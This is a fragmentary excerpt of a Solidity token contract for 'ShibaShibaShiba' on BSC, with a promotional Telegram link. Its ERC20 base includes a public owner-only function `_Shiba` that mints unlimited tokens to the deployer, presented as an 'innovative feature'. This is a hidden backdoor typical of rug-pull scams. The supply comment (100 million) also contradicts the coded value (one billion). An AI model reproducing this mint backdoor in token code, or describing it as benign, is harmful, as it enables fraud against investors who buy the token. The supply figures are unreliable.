...
//
// $ShibaShibaShiba proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ShibaShibaShibaBsc
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Shiba(uint256 amount) public onlyOwner {
 _Shiba(msg.sender, amount);
    }
    ...
    function _Shiba(address account, uint256 amount) internal virtual {
...
contract $ShibaShibaShiba is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("ShibaShibaShiba", "SHIBA") {
     _Shiba(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}